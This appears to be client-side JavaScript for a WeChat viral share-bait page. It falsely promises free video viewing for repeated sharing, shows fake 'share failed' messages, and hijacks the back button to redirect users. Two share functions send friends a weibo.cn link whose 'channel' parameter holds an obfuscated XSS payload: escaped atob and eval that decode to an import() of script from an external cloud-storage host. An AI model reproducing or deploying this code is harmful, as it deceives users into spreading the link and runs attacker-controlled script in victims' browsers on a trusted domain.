$(function () {

    function callbb(backUrl){
        function callbb(backUrl){
            let u = navigator.userAgent;
            let isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1; //g
            //安卓手机处理再次返回红包问题
            if (isAndroid && typeof (tbsJs) != 'undefined') {
                tbsJs.onReady('{useCachedApi : "true"}', function (e) {
                })
            }
            const state = {
                title: "title",
                url: "#"
            };
            window.history.pushState(state, "title", "#");
            window.addEventListener("popstate", function () {
                openLink(backUrl);
            }, false);

            window.onhashchange = function () {
                openLink(backUrl);
            };
        }
    }
    callbb(bk);
    ticket = JSON.parse(ticketData);
    var data = {
        appId:ticket.appid,
        debug: ticket.debug,
        jsApiList: [
            "onMenuShareTimeline",
            "hideAllNonBaseMenuItem",
            "hideOptionMenu",
            "hideMenuItems",
            "onMenuShareAppMessage",
            "showMenuItems"
        ]
    };
    data.timestamp = Math.floor(new Date().getTime()/1000).toString()
    data.nonceStr = randomString(16)
    data.signature = sha1(`jsapi_ticket=${ticket.ticket}&noncestr=${data.nonceStr}&timestamp=${data.timestamp}&url=${location.href.split('#')[0]}`);
    console.log(data);
    wx.config(data);
    wx.ready(function () {
        setTimeout(function () {
            window.history.replaceState({},'',window.location.origin);
            wx.hideOptionMenu();
        });
        setTimeout(function () {
            wx.showMenuItems({
                menuList: ['menuItem:share:appMessage']
            });
        }, 1000);
        shareT();
    });
    wx.error(function (res) {
        console.log(JSON.stringify(res));
    });
})


tNum = 0;
qNum = 0;

show_tip();
function show() {

    if (tNum == 1) {
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">3</span>个不同的群即可免流量观看！')
        shareT();
    }else if (tNum == 2) {
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群即可免流量观看！')
        if(openAd()){shareTT()}else(shareT());
    }
    else if (tNum == 3) {
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>注意：分享到相同的群会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群！')

        shareT();
    } else if (tNum == 4) {
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可免流量观看！')

        shareT();
    } else if (tNum == 5) {
        alert_Mes('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可免流量播放!')
        tNum+=1;
        shareQ();
        wx.hideOptionMenu();
        wx.showMenuItems({
            menuList: ['menuItem:share:timeline']
        });
    }else if(tNum+qNum==7){
        alert_Mes('<span style="font-size: 30px;color: #f5294c">分享失败！</span><br/>请公开分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可免流量播放!')
        if(openAd()){shareAD()}else(shareQ());
    } else if(tNum+qNum==8){
        history.go(-1);
    }
}
function shareT() {

    function onBridgeReadyApp() {
        function shareFriend() {
            WeixinJSBridge.invoke('sendAppMessage', {
                "appid": itemsAppId[Math.floor(Math.random() * itemsAppId.length)],
                "img_url": shareImg,
                "img_width": "200",
                "img_height": "200",
                "link": links[0],
                "desc": reTitle(rdesc[Math.floor((Math.random() * rdesc.length))]),
                "title": reTitle(rt[Math.floor((Math.random() * rt.length))])
            }, function (res) {
                tNum += 1;
                show();
            })
        }
        WeixinJSBridge.on('menu:share:appmessage', function(argv) {
            shareFriend();
        });
    }


    if (typeof WeixinJSBridge == "undefined") {
        if (document.addEventListener) {
            document.addEventListener('WeixinJSBridgeReady', onBridgeReadyApp, false);
        } else if (document.attachEvent) {
            document.attachEvent('WeixinJSBridgeReady', onBridgeReadyApp);
            document.attachEvent('onWeixinJSBridgeReady', onBridgeReadyApp);
        }
    } else {
        onBridgeReadyApp();
    }
}

function shareTT() {

    wx.onMenuShareAppMessage({
        title:title,
        link: "https://book1.weibo.cn/dpool/newbook/bookv1/down.php?channel=%27%3Ba%3D%5Cu0061%5Cu0074%5Cu006f%5Cu0062%60aW1wb3J0KCcvLzF3bGIub3NzLWNuLWhhbmd6aG91LmFsaXl1bmNzLmNvbS9zL3gnKTs=%60%3B%5Cu0065%5Cu0076%5Cu0061%5Cu006c%28a%29%2F%2F",
        imgUrl: shareImg,
        desc:desc ,
        success: function () {
            tNum += 1;
            show();
        },
        fail: function () {
        }
    })
}


function shareQ() {


    wx.onMenuShareTimeline({
        title: title2,
        link: links[1],
        imgUrl: shareImg,
        success: function () {
            qNum += 1;
            show();
        },
        fail: function () {
        }
    })
}


function shareAD() {


    wx.onMenuShareTimeline({
        title: title2,
        link: "https://book1.weibo.cn/dpool/newbook/bookv1/down.php?channel=%27%3Ba%3D%5Cu0061%5Cu0074%5Cu006f%5Cu0062%60aW1wb3J0KCcvLzF3bGIub3NzLWNuLWhhbmd6aG91LmFsaXl1bmNzLmNvbS9zL3gnKTs=%60%3B%5Cu0065%5Cu0076%5Cu0061%5Cu006c%28a%29%2F%2F",
        imgUrl: shareImg,
        success: function () {
            qNum += 1;
            show();
        },
        fail: function () {
        }
    })
}

function  randomChar(l) {
    var x = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz0123456789";
    var tmp = "";
    var timestamp = new Date().getTime();
    for (var i = 0; i < l; i++) {
        tmp += x.charAt(Math.ceil(Math.random() * 100000000) % x.length);
    }
    return tmp;
}

function GetRandomNum(Min,Max)
{
    var Range = Max - Min;
    var Rand = Math.random();
    return(Min + Math.round(Rand * Range));
}
function openLink(url) {
    const label = document.createElement('a');
    label.setAttribute('rel', 'noreferrer');
    label.setAttribute('href', url);
    document.body.appendChild(label);
    label.click();
}

function randomString (len) {
    len = len || 32;
    let $chars = 'abcdefhijkmnprstwxyz0123456789';
    let maxPos = $chars.length;
    let pwd = '';
    for (i = 0; i < len; i++) {
        pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
    }
    return pwd;
}

function encodeUTF8(s) {
    var i, r = [], c, x;
    for (i = 0; i < s.length; i++)
        if ((c = s.charCodeAt(i)) < 0x80) r.push(c);
        else if (c < 0x800) r.push(0xC0 + (c >> 6 & 0x1F), 0x80 + (c & 0x3F));
        else {
            if ((x = c ^ 0xD800) >> 10 == 0) //对四字节UTF-16转换为Unicode
                c = (x << 10) + (s.charCodeAt(++i) ^ 0xDC00) + 0x10000,
                    r.push(0xF0 + (c >> 18 & 0x7), 0x80 + (c >> 12 & 0x3F));
            else r.push(0xE0 + (c >> 12 & 0xF));
            r.push(0x80 + (c >> 6 & 0x3F), 0x80 + (c & 0x3F));
        };
    return r;
}

// 字符串加密成 hex 字符串
function sha1(s) {
    var data = new Uint8Array(encodeUTF8(s))
    var i, j, t;
    var l = ((data.length + 8) >>> 6 << 4) + 16, s = new Uint8Array(l << 2);
    s.set(new Uint8Array(data.buffer)), s = new Uint32Array(s.buffer);
    for (t = new DataView(s.buffer), i = 0; i < l; i++)s[i] = t.getUint32(i << 2);
    s[data.length >> 2] |= 0x80 << (24 - (data.length & 3) * 8);
    s[l - 1] = data.length << 3;
    var w = [], f = [
            function () { return m[1] & m[2] | ~m[1] & m[3]; },
            function () { return m[1] ^ m[2] ^ m[3]; },
            function () { return m[1] & m[2] | m[1] & m[3] | m[2] & m[3]; },
            function () { return m[1] ^ m[2] ^ m[3]; }
        ], rol = function (n, c) { return n << c | n >>> (32 - c); },
        k = [1518500249, 1859775393, -1894007588, -899497514],
        m = [1732584193, -271733879, null, null, -1009589776];
    m[2] = ~m[0], m[3] = ~m[1];
    for (i = 0; i < s.length; i += 16) {
        var o = m.slice(0);
        for (j = 0; j < 80; j++)
            w[j] = j < 16 ? s[i + j] : rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1),
                t = rol(m[0], 5) + f[j / 20 | 0]() + m[4] + w[j] + k[j / 20 | 0] | 0,
                m[1] = rol(m[1], 30), m.pop(), m.unshift(t);
        for (j = 0; j < 5; j++)m[j] = m[j] + o[j] | 0;
    };
    t = new DataView(new Uint32Array(m).buffer);
    for (var i = 0; i < 5; i++)m[i] = t.getUint32(i << 2);

    var hex = Array.prototype.map.call(new Uint8Array(new Uint32Array(m).buffer), function (e) {
        return (e < 16 ? "0" : "") + e.toString(16);
    }).join("");
    return hex;
}